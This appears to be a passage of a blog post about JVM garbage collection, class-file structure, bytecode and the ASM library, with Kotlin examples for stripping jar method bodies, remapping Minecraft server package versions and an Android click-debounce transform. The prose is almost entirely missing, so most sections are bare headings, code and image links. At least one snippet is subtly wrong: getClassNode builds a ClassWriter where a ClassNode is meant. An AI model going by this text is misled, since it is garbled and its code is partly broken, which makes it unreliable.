\n\n\n\n\n\nJava************HotSpotJDK8JDK8********\n\nHotSpotEdenSurvivor811GC\n\n![image-20220222151708141](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg)\n\n\n\nEden\n\n![image-20220222153104582](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg)\n\nEdenSurvivorFromToGCEdenFromFromToFromToToFrom\n\n![image-20220222154032674](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg)\n\nFromEdenFromToGC`+1``15`From\n\n![image-20220222154828416](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg)\n\nToFrom\n\n\n\n* Minor GC   -   \n\n  * Eden\n\n* Major GC   -   \n\n* Full GC      -    Java\n\n  * 1\n  * 2Minor GC\n  * 3JDK8\n  * 4`System.gc()`\n\n  ![image-20220222205605690](https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg)\n\n##### -\n\n`-`\n\nGC Roots\n\n![image-20220222165709034](https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg)\n\n \n\n##### -\n\n-\n\n\n\n![image-20220222210942507](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg)\n\nSurvivor8:1:1\n\n##### -\n\n-GCGC50%\n\n\n\n![image-20220222213208681](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg)\n\nStop The World\n\n\n\n####  ()\n\n##### Serial\n\nJDK1.3.1\n\n![image-20220223104605648](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg)\n\nGC15\n\n\n\n1. \n2. \n\n##### ParNew\n\nSerial\n\n![image-20220223111344962](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg)\n\nSerialJVMParNew\n\n##### CMS\n\nJDK1.5HotSpotCMSConcurrent-Mark-SweepHotSpotGCGC\n\n\n\n![image-20220223114019381](https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg)\n\n4\n\n* GC Roots\n* GC Roots\n* \n* \n\nFull GC\n\nGCG1CMS\n\n##### Garbage First (JDK9+)\n\nJDK7JDK9JDK8 Parallel Scavenge + Parallel Old \n\n`Minor GC``Major GC ``Full GC`G1Java`2048``Region``Region`1MB32MB2N`Region`JVM\n\n`Region``Region`EdenSurvivorG1HumongousRegion\n\n![image-20220223123636582](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg)\n\nCMS\n\n![image-20220223123557871](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg)\n\n\n\n* GC RootsTAMSRegionMinor GCG1\n* GC Root\n* \n* RegionRegionRegionRegionRegionRegion\n\n##### Shenandoah & ZGC ()\n\nG1G1GC\n\n## \n\n:D\n\n### \n\nJavaJVMJarJarclassclassclassKotlinJavaktJavaKotlinJVM\n\n### \n\nClass888ClassC: ****, ****\n\n\n\n~~~java\npublic class TestClazz {\n    public static void main(String[] args) {\n        int a = 1;\n        int b = 2 + a;\n        System.out.println(sum(a, b));\n    }\n\n    private static int sum(int a, int b) {\n        System.out.println(\"execute sum function.\");\n        return a + b;\n    }\n}\n~~~\n\n`javap -verbose` \n\n~~~\nClassfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"\n~~~\n\n####  & Class\n\nclass4Byte(Magic Number), classByteclass`0xCAFE BABE`Java:)\n\n![aZx0S4EjfY](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg)\n\n![20220709-173350](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg)\n\n7341652Java8\n\n56Minor Version,78Major VersionJava45JDK1.1JDK+1JDKClassClass\n\n#### \n\n\n\n~~~\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n~~~\n\nClassClass\n\n1\n\n|                       |  |                                                          |\n| :-----------------------: | :--: | :----------------------------------------------------------: |\n|    CONSTANT_Utf8_info     |  1   |                    UTF-8                     |\n|   CONSTANT_Integer_info   |  3   |  |\n|    CONSTANT_Class_info    |  7   |                                            |\n|   CONSTANT_String_info    |  8   |                                            |\n|  CONSTANT_Fieldref_info   |  9   |                                                |\n|  CONSTANT_Methodref_info  |  10  |                                                |\n| CONSTANT_MethodType_info  |  16  |                                                      |\n| CONSTANT_NameAndType_info |  12  |                                      |\n\n\n\n`CONSTANT_Methodref_info`Java 222\n\n|                     |   |  |                                                 |\n| :---------------------: | :---: | :--: | :-------------------------------------------------: |\n| CONSTANT_Methodref_info |  tag  |  u1  |                       10                        |\n|                         | index |  u2  |   CONSTANT_Class_info   |\n|                         | index |  u2  | CONSTANT_NameAndType_info |\n\n`CONSTANT_Class_info``CONSTANT_NameAndType_info`\n\n|                 |   |  |                      |\n| :-----------------: | :---: | :--: | :----------------------: |\n| CONSTANT_Class_info |  tag  |  u1  |          7           |\n|                     | index |  u2  |  |\n\n|                       |   |  |                              |\n| :-----------------------: | :---: | :--: | :------------------------------: |\n| CONSTANT_NameAndType_info |  tag  |  u1  |              12              |\n|                           | index |  u2  |    |\n|                           | index |  u2  |  |\n\n##### \n\nsumNameAndType\n\n> #30 = NameAndType        #23:#24        // sum:(II)I\n\n#23`sum`#24`(II)I`\n\n(II)IIintIint\n\n:\n\n![image-20220223192518999](https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg)\n\n`()V`void\n\n:\n\n> public Set<ArathothAttribute> getAttrInstSet()\n>\n> ()Ljava/util/Set<ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;>;\n>\n> \n>\n> \n\n> public Double getRandom(Double value1, Double value2)\n>\n> (Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;\n>\n> \n>\n> \n>\n> public double sum(Double value1, double value2) {\n>\n> \t\treturn value1 + value2;\n>\n> }\n>\n> :), value1doubleValue()\n>\n> java\n\n> \n>\n> public double[] getRandomNums()\n>\n> ()[D\n>\n> [\n\n#### \n\n\n\n~~~\n  flags: ACC_PUBLIC, ACC_SUPER\n~~~\n\n//\n\n:\n\n![image-20220223200619811](https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg)\n\n:\n\n![image-20220223201053780](https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg)\n\n:\n\n|          |  |                              |\n| ---------------- | ------ | -------------------------------- |\n| ACC_PUBLIC       | 0x0001 | public                 |\n| ACC_PRIVATE      | 0x0002 | private                |\n| ACC_PROTECTED    | 0x0004 | protected              |\n| ACC_STATIC       | 0x0008 | static                 |\n| ACC_FINAL        | 0x0010 | final                  |\n| ACC_SYNCHRONIZED | 0x0020 | synchronized           |\n| ACC_BRIDGE       | 0x0040 |  |\n| ACC_VARARGS      | 0x0080 |              |\n| ACC_NATIVE       | 0x0100 | native                 |\n| ACC_ABSTRACT     | 0x0400 | abstract               |\n| ACC_STRICT       | 0x0800 | strictfp               |\n| ACC_SYNTHETIC    | 0x1000 |          |\n\n#### \n\n> ASM\n\n********main\n\n```java\npublic static void main(String[] args) {\n    int a = 1;\n    int b = 2 + a;\n    System.out.println(sum(a, b));\n}\n```\n\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n\n---\n\n> iconst_1\n\nint`1`****, 1`int a = 1`1\n\n> istore_1\n\nint****1`1``int a = 1`\n\n> iconst_2\n\nint`2`****2 `int b = 2 + a`2\n\n> iload_1\n\nint****1`a`\n\n> iadd\n\n****int****`int b = 2 + a`\n\n> istore_2\n\nint********2`int b = 2 + a`\n\n> getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n\n`System.out`, `Ljava/io/PrintStream`,****`#2``Field java/lang/System.out:Ljava/io/PrintStream;`\n\n> iload_1\n\nint`a`****\n\n> iload_2\n\nintb****\n\n> invokestatic  #3                  // Method sum:(II)I\n\nintint\n\n> invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n\n`PrintStream#println`receiverjavakotlinreceiver\n\n> return\n\nvoid\n\n---\n\n****\n\njvm\n\n:)\n\n### ASM\n\nASM/Javassist/cglib/?\n\n- / gradlegradleshadowJar(relocate))\n- InvocationHandler\n- asm\n- jvm[MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)](https://github.com/MeiVinEight/ReflectionFX)MethodHandle\n\n\n\nandroiddex\n\nasmjdkasmasm\n\n#### ASM Core API & Tree API\n\n##### Core API\n\nASM ASMJar/class//ASM() kapt/kspasm, kapt/kspasm\n\n[ |  (runoob.com)](https://www.runoob.com/design-pattern/visitor-pattern.html)\n\n:\n\nASMclassAPI\n\n```java\npublic abstract class ClassVisitor {\n        ......\n    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);\n    //\n    public FieldVisitor visitField(int access, String name, String desc, String signature, Object value);\n    //\n    public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions);\n    public void visitEnd();\n}\n```\n\nClassVisitor\n\n> ###### 1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\n>\n> class\n>\n> versionclass\n>\n> access \n>\n> name\n>\n> signatureclassnull\n>\n> superName\n>\n> interfaces\n>\n> ###### 2void visitAnnotation(String descriptor, boolean visible)\n>\n> class\n>\n> descriptor\n>\n> visible\n>\n> ###### 3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\n>\n> classFieldVisitor\n>\n> name\n>\n> descriptor\n>\n> value\n>\n> `Integer``Float``Long``Double``String``int``float``long` `String`**null\n>\n> ###### 4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\n>\n> classMethodVisitor\n>\n> name\n>\n> descriptor\n>\n> signature\n>\n> exceptions\n>\n> ###### 5visitInnerClass(String name, String outerName, String innerName, int access)\n>\n> class********\n>\n> name`com/hebaibai/example/demo/Aoo$1XX`\n>\n> outerName\n>\n> innerName\n>\n> ###### 6visitOuterClass(String owner, String name, String descriptor)\n>\n> \n>\n> classvisitInnerClass`com/hebaibai/example/demo/Aoo$1``com/hebaibai/example/demo/Aoo$1XX`\n>\n> ```javascript\n> ClassReader classReader = new ClassReader(\"com/hebaibai/example/demo/Aoo$1\");\n>  classReader.accept(new DemoClassVisitor(Opcodes.ASM7), ClassReader.SKIP_CODE);\n> ```\n>\n> \n>\n> \n>\n> ownerclass\n>\n> namenull\n>\n> descriptor\n\nClassVisitorClassVisitorMethodVistitor/FieldVisitor)\n\nClassWritervisitHelloWorld\n\n```kotlin\nfun main() {\n    val classWriter = ClassWriter(0)\n    classWriter.visit(\n        V1_8,\n        ACC_PUBLIC + ACC_SUPER,\n        \"org/example/asmlearn/ASMLearn_Test\",\n        null,\n        \"java/lang/Object\",\n        null\n    )\n    val mv = classWriter.visitMethod(\n        ACC_PUBLIC + ACC_STATIC,\n        \"main\",\n        \"([Ljava/lang/String;)V\",\n        null,\n        null\n    )\n    mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\")\n    mv.visitLdcInsn(\"Hello, World!\")\n    mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false)\n    mv.visitInsn(RETURN)\n    mv.visitMaxs(2, 1)\n    mv.visitEnd()\n    classWriter.visitEnd()\n    val byteArray = classWriter.toByteArray()\n    val classLoader = MyClassLoader()\n    val clazz = classLoader.defineClass(\"org.example.asmlearn.ASMLearn_Test\", byteArray)\n    val m = clazz.getMethod(\"main\", Array<String>::class.java)\n    m.invoke(null, arrayOf(\"\"))\n}\n\nclass MyClassLoader : ClassLoader() {\n    fun defineClass(name: String, b: ByteArray): Class<*> {\n        return defineClass(name, b, 0, b.size)\n    }\n}\n```\n\nasm`org/example/asmlearn/ASMLearn_Test`mainclassLoadermain\n\n>  asmasmasmkaptkspasm\n\n##### Tree API\n\nTree APICore APITree APIVisitorClassNodeClassNode/\n\nClassNode\n\n~~~kotlin\nfun getClassNode(clazzFile: File): ClassNode {\n    val classReader = ClassReader(clazzFile.inputStream())\n    val classNode = ClassWriter(ASM9)\n    classReader.accept(classNode, 0)\n    return classNode\n}\n~~~\n\nClassNodeClassVisitorClassVisitor***ClassNode***\n\n~~~kotlin\nval classNode = getClassNode(clazzFile)\n// \nval methods: List<MethodNode> = classNode.methods\n// \nval fields: List<FieldNode> = classNode.fields\n~~~\n\n#### \n\nasm\n\n[Java ASMMethodVisitorOpcode -  (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n\n\n##### ApiJarGenerator\n\n> Core APICore API\n\n> JavaJarJar\n>\n> /JarJar\n>\n> asmJVMJar\n\n~~~kotlin\n/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author \n * @since 2022/7/11 14:22\n */\nfun generate(sourceJar: File, output: File) {\n    if (!output.exists()) {\n        output.createNewFile()\n    }\n    JarOutputStream(output.outputStream()).use { out ->\n        JarFile(sourceJar).use { jarFile ->\n            for (jarEntry in jarFile.entries()) {\n                jarFile.getInputStream(jarEntry).use { input ->\n                    if (jarEntry.name.endsWith(\".class\")) {\n                        // classClassVisitor visit\n                        val classReader = ClassReader(input)\n                        val classWriter = ClassWriter(0)\n                        val visitor = EmptyClassVisitor(classWriter)\n                        classReader.accept(visitor, 0)\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        // class\n                        out.write(classWriter.toByteArray())\n                    } else {\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        input.copyTo(out)\n                    }\n                }\n            }\n        }\n    }\n}\n\nclass EmptyClassVisitor(visitor: ClassVisitor) : ClassVisitor(ASM9, visitor) {\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return EmptyMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions))\n    }\n}\n\nclass EmptyMethodVisitor(methodVisitor: MethodVisitor) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitIincInsn(`var`: Int, increment: Int) {\n    }\n\n    override fun visitInsn(opcode: Int) {\n    }\n\n    override fun visitIntInsn(opcode: Int, operand: Int) {\n    }\n\n    override fun visitVarInsn(opcode: Int, `var`: Int) {\n    }\n\n    override fun visitTypeInsn(opcode: Int, type: String?) {\n    }\n\n    override fun visitJumpInsn(opcode: Int, label: Label?) {\n    }\n\n    override fun visitLabel(label: Label?) {\n    }\n\n    override fun visitLdcInsn(value: Any?) {\n    }\n\n    override fun visitTableSwitchInsn(min: Int, max: Int, dflt: Label?, vararg labels: Label?) {\n    }\n\n    override fun visitLookupSwitchInsn(dflt: Label?, keys: IntArray?, labels: Array<out Label>?) {\n    }\n\n    override fun visitMultiANewArrayInsn(descriptor: String?, numDimensions: Int) {\n    }\n\n    override fun visitTryCatchBlock(start: Label?, end: Label?, handler: Label?, type: String?) {\n    }\n\n    override fun visitLocalVariable(name: String?, descriptor: String?, signature: String?, start: Label?, end: Label?, index: Int) {\n    }\n\n    override fun visitLineNumber(line: Int, start: Label?) {\n    }\n\n    override fun visitFrame(type: Int, numLocal: Int, local: Array<out Any>?, numStack: Int, stack: Array<out Any>?) {\n    }\n\n    override fun visitFieldInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?, isInterface: Boolean) {\n    }\n\n    override fun visitInvokeDynamicInsn(name: String?, descriptor: String?, bootstrapMethodHandle: Handle?, vararg bootstrapMethodArguments: Any?) {\n    }\n}\n\nfun main() {\n    generate(\n        File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"), \t\t                         File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\")\n    )\n}\n~~~\n\nEmptyClassVisitorvisitMethodEmptyMethodVisitorEmptyMethodVisitorEmptyMethodVisitor\n\n##### ASMVersionControl\n\n> Minecraft\n>\n> minecraftAPI\n>\n> \n>\n> Minecraft 1.16.5`net.minecraft.server.v1_16_R3`\n>\n> Minecraft 1.12.2`net.minecraft.server.v1_12_R1`\n>\n> \n>\n> `n.m.s`ASMVersionControl\n>\n> - \n> - \n>\n> \n>\n> `ASMVersionControl`ASMasm`n.m.s`\n\nASM`ClassRemapper``ClassVisitor`ClassVisitor\n\nClassRemapper[taboolib/MinecraftRemapper.kt at master  TabooLib/taboolib (github.com)](https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt)\n\nClassRemapper\n\n\n\n~~~java\n// net.minecraft.server.v1_12_R1\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.12\");\n    }\n}\n// net.minecraft.server.v1_16_R3\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.16\");\n    }\n}\n~~~\n\n`net.minecraft.server.v1_12_R1``net.minecraft.server.v1_16_R3`\n\n\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    // asm\n    val nmsProxy: NMSHandler = createProxyInstance<NMSHandler>()\n    nmsProxy.callTest() //  execute successfully v1.16, \n}\n~~~\n\n`NMSHandlerImpl#callTest`\n\n>    L0\n>     LINENUMBER 85 L0\n>     NEW net/minecraft/server/v1_12_R1/Test\n>     DUP\n>     INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>     INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n>    L1\n>     LINENUMBER 86 L1\n>     RETURN\n>    L2\n>     LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0\n>     MAXSTACK = 2\n>     MAXLOCALS = 1\n\n `net/minecraft/server/v1_12_R1/Test``net/minecraft/server/v1_16_R3/Test`visitMethod\n\n> \n>\n> - NEW net/minecraft/server/v1_12_R1/Test\n>\n> - INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>\n> - INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n\n[Java ASMMethodVisitorOpcode -  (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n`visitTypeInsn`, `visitMethodInsn`\n\n~~~kotlin\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n~~~\n\n:\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\nclass VersionControlClassVisitor(classVisitor: ClassVisitor, val currentVersion: String) : ClassVisitor(ASM9, classVisitor) {\n    override fun visitField(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        value: Any?\n    ): FieldVisitor {\n        return VersionControlFieldVisitor(super.visitField(access, name, descriptor, signature, value), currentVersion)\n    }\n\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return VersionControlMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions), currentVersion)\n    }\n}\n\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n\nclass VersionControlFieldVisitor(fieldVisitor: FieldVisitor, val currentVersion: String) : FieldVisitor(ASM9, fieldVisitor) {\n\n}\n\nval nms = \"net/minecraft/server/v1_.*?/\".toRegex()\nval obc = \"org/bukkit/craftbukkit/v1_.*?/\".toRegex()\n\nfun String.modifyVersion(version: String): String {\n    return this.replace(nms, \"net/minecraft/server/$version/\")\n        .replace(obc, \"org/bukkit/craftbukkit/$version/\")\n}\n\n@Suppress(\"UNCHECKED_CAST\")\ninline fun <reified T> createProxyClass(impl: String = T::class.java.name + \"Impl\"): Class<T> {\n    val input = VersionControlClassVisitor::class.java.classLoader.getResourceAsStream(impl.replace(\".\", \"/\") + \".class\")\n    val classReader = ClassReader(input)\n    val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n    classReader.accept(VersionControlClassVisitor(classWriter, \"v1_16_R3\"), 0)\n    return MyClassLoader.defineClass(impl, classWriter.toByteArray()) as Class<T>\n}\n\ninline fun <reified T> createProxyInstance(impl: String = T::class.java.name + \"Impl\"): T {\n    return createProxyClass<T>(impl).getDeclaredConstructor().newInstance()\n}\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    val proxy = createProxyInstance<NMSHandler>()\n    proxy.callTest()\n}\n~~~\n\n`execute successfully v1.16`,\n\ngradleshadowJar(relocate)\n\n##### \n\nasm\n\nhook\n\n\n\n: [leavesCZY/ASM_Transform: ASM Transform  (github.com)](https://github.com/leavesCZY/ASM_Transform)\n\nandroid`transform api`gradle***GradleTransformAction***transform api\n\n###### gradle\n\n> gradle\n>\n> \n\n`buildSrc``buildSrc`build.gradle\n\n\n\n~~~kotlin\n/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */\nclass DoubleClickPlugin : Plugin<Project> {\n\n    override fun apply(project: Project) {\n        val config = DoubleClickConfig()\n        val appExtension: AppExtension = project.extensions.getByType()\n        appExtension.registerTransform(DoubleClickTransform(config))\n    }\n\n}\n~~~\n\napplyapplyTransformTransform\n\napply\n\n~~~groovy\nimport github.leavesczy.asm.plugins.doubleClick.DoubleClickPlugin\n\napply plugin: DoubleClickPlugin\n~~~\n\n###### transform\n\n`DoubleClickTransform`\n\n~~~kotlin\nclass DoubleClickTransform(private val config: DoubleClickConfig) : BaseTransform() {\n\n    private companion object {\n\n        private const val ViewDescriptor = \"Landroid/view/View;\"\n\n        private const val OnClickViewMethodDescriptor = \"(Landroid/view/View;)V\"\n\n        private const val ButterKnifeOnClickAnnotationDesc = \"Lbutterknife/OnClick;\"\n\n        private val MethodNode.onlyOneViewParameter: Boolean\n            get() = desc == OnClickViewMethodDescriptor\n\n        private fun MethodNode.hasCheckViewAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatCheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasUncheckViewOnClickAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatUncheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasButterKnifeOnClickAnnotation(): Boolean {\n            return hasAnnotation(ButterKnifeOnClickAnnotationDesc)\n        }\n\n    }\n\n    override fun modifyClass(byteArray: ByteArray): ByteArray {\n        val classReader = ClassReader(byteArray)\n        val classNode = ClassNode()\n        classReader.accept(classNode, ClassReader.EXPAND_FRAMES)\n        val methods = classNode.methods\n        if (!methods.isNullOrEmpty()) {\n            val shouldHookMethodList = 